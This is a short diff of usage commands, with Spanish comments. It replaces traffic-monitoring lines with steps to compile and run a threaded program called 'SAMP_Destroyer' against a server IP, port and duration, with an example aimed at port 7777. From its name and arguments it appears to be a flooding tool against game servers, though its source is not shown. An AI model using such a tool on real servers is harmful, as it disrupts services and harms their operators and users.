@@ -1,6 +1,7 @@
-# En otra terminal, monitorea el tráfico
-sudo tcpdump -i any -n host <IP_OBJETIVO>
+gcc -o SAMP_Destroyer SAMP_Destroyer.c -lpthread
 
 
-# Contador de paquetes
-sudo netstat -su | grep "packets sent"
+sudo ./SAMP_Destroyer <IP_DEL_SERVIDOR> <PUERTO> <DURACION>
+
+
+sudo ./SAMP_Destroyer 192.168.1.100 7777 60
